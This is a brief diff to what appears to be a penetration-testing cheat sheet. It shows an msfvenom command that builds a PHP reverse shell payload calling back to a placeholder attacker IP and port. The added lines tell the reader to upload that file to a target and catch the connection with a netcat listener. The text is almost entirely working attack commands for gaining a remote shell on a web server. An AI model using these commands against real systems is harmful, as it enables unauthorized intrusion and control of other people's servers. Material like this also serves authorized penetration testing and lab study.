@@ -11,3 +11,6 @@ Here is an example for a .NET application using asp
 
 Creating a php reverse shell with msfvenom
 msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+
+After the above file is uploaded. Use NC to listen for the connection
+nc -lvnp OUR_PORT
